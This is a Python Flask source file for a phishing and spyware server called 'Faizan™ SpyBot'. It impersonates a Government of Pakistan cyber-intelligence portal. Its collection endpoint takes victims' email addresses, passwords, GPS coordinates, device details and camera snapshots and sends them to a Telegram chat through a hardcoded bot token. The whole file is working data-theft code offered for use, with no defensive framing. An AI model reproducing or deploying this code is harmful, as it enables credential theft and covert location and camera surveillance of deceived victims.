from flask import Flask, request, render_template
import requests, base64, os

app = Flask(__name__)

# Telegram Configurations
BOT_TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
CHAT_ID = '6908281054'
YOUR_SITE_LINK = "https://govt-of-punjab-pak.onrender.com"

# Welcome message for /start
def send_welcome():
    welcome_text = f"""👋 *Welcome to Faizan™ SpyBot!*

⚠️ *Government of Pakistan – Cyber Intelligence*

🔗 [Live Monitoring Portal]({YOUR_SITE_LINK})

This system is confidential. Your location, device, and camera are under analysis."""
    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        json={
            "chat_id": CHAT_ID,
            "text": welcome_text,
            "parse_mode": "Markdown",
            "disable_web_page_preview": False
        }
    )

@app.route('/')
def index():
    send_welcome()
    return render_template("spy.html")

@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()
    email = data.get("email", "❌ Not Provided")
    password = data.get("password", "❌ Not Provided")
    user_agent = data.get("userAgent")
    latitude = data.get("latitude")
    longitude = data.get("longitude")
    camera = data.get("camera")
    device_info = data.get("deviceInfo")
    image_data = data.get("image")

    location_text = f"📍 Location: {latitude}, {longitude}" if latitude and longitude else "❌ Location Blocked"
    map_link = f"\n📌 [View on Map](https://maps.google.com/?q={latitude},{longitude})" if latitude and longitude else ""
    message = f"""
🕵️‍♂️ *Faizan™ SpyBot Alert*
📧 Email: `{email}`
🔑 Password: `{password}`
{location_text}{map_link}
📷 Camera: {camera}
🧠 Device: {device_info}
🌐 UserAgent: `{user_agent}`
"""

    send_to_telegram(message)

    if image_data:
        send_photo(image_data)

    return "✅ Data Collected"

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "Markdown"
    }
    requests.post(url, json=payload)

def send_photo(base64_image):
    try:
        img_bytes = base64.b64decode(base64_image.split(',')[1])
        files = {'photo': ('snapshot.jpg', img_bytes)}
        data = {'chat_id': CHAT_ID}
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", files=files, data=data)
    except Exception as e:
        print("❌ Camera Photo Error:", e)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
